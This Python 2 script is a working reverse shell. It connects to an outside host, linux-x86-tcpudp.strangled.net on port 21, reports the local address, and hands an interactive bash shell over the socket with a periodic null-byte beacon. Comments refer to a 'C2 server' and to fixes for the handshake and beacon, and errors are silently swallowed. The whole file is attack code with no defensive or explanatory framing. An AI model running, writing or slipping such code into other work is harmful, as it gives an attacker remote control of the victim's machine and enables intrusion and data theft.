import socket, os, pty, select, subprocess

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Ensure this points to your verified proxy VM or C2 server port
    s.connect(("linux-x86-tcpudp.strangled.net", 21))
    
    try: local_ip = s.getsockname()
    except: local_ip = "Legacy"
    
    # THE CRITICAL FIXED HANDSHAKE: Notice the added backslash for a real newline (\n)
    s.sendall(str(local_ip) + "\n")
    
    master, slave = os.openpty()
    p = subprocess.Popen(["/bin/bash", "-i"], stdin=slave, stdout=slave, stderr=slave, preexec_fn=os.setsid)
    os.close(slave)
    
    while p.poll() is None:
        r, _, _ = select.select([s, master], [], [], 5)
        if not r:
            try: 
                # THE CRITICAL FIXED BEACON: Notice the added backslash for a real null byte (\x00)
                s.sendall("\x00")
            except: 
                break
            continue
        for fd in r:
            if fd == s:
                d = s.recv(4096)
                if not d: break
                os.write(master, d)
            elif fd == master:
                d = os.read(master, 4096)
                if not d: break
                s.sendall(d)
        else:
            continue
        break
    p.terminate()
except Exception, e:
    pass
